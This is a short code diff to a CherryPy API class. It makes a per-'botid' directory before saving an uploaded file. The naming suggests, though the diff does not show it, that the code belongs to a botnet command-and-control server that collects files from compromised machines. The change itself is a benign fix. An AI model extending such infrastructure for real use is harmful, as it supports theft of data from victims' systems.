@@ -246,6 +246,8 @@ class API(object):
             raise cherrypy.HTTPError(403)
         global UPLOAD_DIR
         up_dir = os.path.join(UPLOAD_DIR, botid)
+        if not os.path.exists(up_dir):
+            os.makedirs(up_dir)
         while os.path.exists(os.path.join(up_dir, src)):
             src = "_" + src
         save_path = os.path.join(up_dir, src)
